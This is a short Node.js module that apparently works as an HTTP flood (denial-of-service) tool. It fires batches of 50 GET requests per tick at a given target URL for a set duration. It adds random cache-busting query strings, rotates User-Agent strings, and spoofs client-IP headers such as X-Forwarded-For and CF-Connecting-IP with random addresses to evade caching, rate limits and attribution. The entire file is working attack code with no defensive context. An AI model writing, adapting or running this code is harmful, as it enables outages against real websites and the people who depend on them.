const http = require("http");
const https = require("https");
const { URL } = require("url");

function fakeIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join(".");
}

function randomUA() {
  const agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "curl/7.68.0",
    "Wget/1.20.3"
  ];
  return agents[Math.floor(Math.random() * agents.length)];
}

module.exports = function (target, duration) {
  const url = new URL(target);
  const client = url.protocol === "https:" ? https : http;
  const end = Date.now() + duration * 1000;

  function send() {
    const path = url.pathname + "?cb=" + Math.random().toString(36).substring(2);
    const headers = {
      "User-Agent": randomUA(),
      "Referer": "https://" + url.hostname + "/",
      "X-Forwarded-For": fakeIP(),
      "Client-IP": fakeIP(),
      "CF-Connecting-IP": fakeIP(),
      "True-Client-IP": fakeIP()
    };

    const options = {
      method: "GET",
      hostname: url.hostname,
      path,
      port: url.port || (url.protocol === "https:" ? 443 : 80),
      headers
    };

    const req = client.request(options, res => {
      console.log(`[${res.statusCode}] from ${url.hostname} using ${options.method}`);
      res.on("data", () => {});
    });
    req.on("error", () => {});
    req.end();
  }

  function loop() {
    if (Date.now() >= end) return;
    for (let i = 0; i < 50; i++) send();
    setImmediate(loop);
  }

  loop();
};
